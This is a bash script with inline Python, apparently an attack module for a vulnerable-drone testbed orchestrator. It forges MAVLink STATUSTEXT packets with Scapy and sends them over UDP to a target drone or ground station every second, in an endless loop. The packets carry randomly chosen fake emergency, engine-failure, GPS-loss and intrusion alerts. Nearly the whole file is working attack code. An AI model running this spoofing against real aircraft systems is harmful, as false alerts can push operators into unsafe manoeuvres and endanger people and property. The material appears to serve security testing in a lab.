#!/usr/bin/env bash
set -euo pipefail

# Attack: Emergency Status Spoofing (MAVLink STATUSTEXT Spoofing, MTD-aware)
# Target Service: DRONE_MAVLINK (Default Port 14550, UDP)

# --- MTD_INTERFACE_START (Mandatory dynamic target acquisition) ---
# Orchestrator가 TARGET_IP, TARGET_PORT, TARGET_SERVICE를 주입해야 합니다.
if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
    exit 1
fi

# 서비스 타입별 기본 포트 설정 (Drone MAVLink UDP를 기본으로 가정)
case "${TARGET_SERVICE:-DRONE_MAVLINK}" in
    DRONE_MAVLINK)
        TARGET_PORT="${TARGET_PORT:-14550}"
        ;;
    *)
        : # 다른 서비스는 Orchestrator가 포트 값을 넣어준다고 가정
        ;;
esac

echo "[INFO] Target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-DRONE_MAVLINK})"
# --- MTD_INTERFACE_END ---

# --- Common Log/BASE Setup ---
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then
    . "$BASE/00_env.sh"
else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"
    mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }
    export -f log
fi

log "[ATTACK] id=emergency-status-spoofing src=Emergency-Status-Spoofing.md"
log "[BLOCK 1] type=python (MAVLink STATUSTEXT Spoofing Script)"

# python3 스크립트를 인라인으로 실행하며 TARGET_IP:TARGET_PORT 인수를 전달합니다.
# MAVLink UDP 공격을 위해 Scapy가 필요하며, sudo 권한으로 실행됩니다.
sudo python3 -u - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
import os
import sys
import re
from pymavlink import mavutil
from scapy.all import *
import time
import sys
import random

# --- Dynamic Target Acquisition ---
if len(sys.argv) <= 1:
    target_ip = os.environ.get('TARGET_IP', '127.0.0.1')
    target_port = os.environ.get('TARGET_PORT', '14550')
    sys.argv = [sys.argv[0], f"{target_ip}:{target_port}"]

if len(sys.argv) != 2:
    print("Usage: python emergency-status-spoofing.py <ip:port>")
    sys.exit(1)

target_ip, target_port_str = sys.argv[1].split(':', 1)
try:
    target_port = int(target_port_str)
except ValueError:
    print(f"[ERROR] Invalid port number '{target_port_str}'.")
    sys.exit(1)
# ----------------------------------

def create_statustext(severity, text):
    # STATUSTEXT 메시지 생성 로직
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.statustext_encode(
        severity=severity,
        text=text.encode('utf-8')
    ).pack(mav)

def send_mavlink_packet(packet_data, target_ip, target_port):
    # UDP 패킷으로 스푸핑 메시지 전송
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    # verbose=False로 설정하여 콘솔 출력 최소화
    send(packet, verbose=False)

if __name__ == "__main__":
    print(f"[INFO] Starting Emergency Status Spoofing to {target_ip}:{target_port} (UDP)")

    # MAVLink Severity 정의 및 메시지 목록
    messages = [
        (mavutil.mavlink.MAV_SEVERITY_EMERGENCY, "EMERGENCY: Immediate action required - Autonomous Land"),
        (mavutil.mavlink.MAV_SEVERITY_ALERT, "ALERT: Critical System Overload"),
        (mavutil.mavlink.MAV_SEVERITY_CRITICAL, "CRITICAL: Engine failure detected. Glide only."),
        (mavutil.mavlink.MAV_SEVERITY_ERROR, "ERROR: GPS signal lost. Switching to Altitude Hold."),
        (mavutil.mavlink.MAV_SEVERITY_WARNING, "WARNING: High temperature detected in ESC."),
        (mavutil.mavlink.MAV_SEVERITY_NOTICE, "NOTICE: Unauthorized access attempt detected.")
    ]

    while True:
        # 무작위로 메시지를 선택하여 전송
        severity, message = random.choice(messages)
        packet = create_statustext(severity, message)
        send_mavlink_packet(packet, target_ip, target_port)
        # print(f"Sent STATUSTEXT packet with severity {severity} and message '{message}'") # 과도한 출력 방지
        time.sleep(1)
PY

log "[BLOCK 2] type=control (In-Foreground Execution)"
# 공격은 Python 인라인 블록에서 포그라운드로 실행되며, Orchestrator에 의해 라이프사이클이 관리됩니다.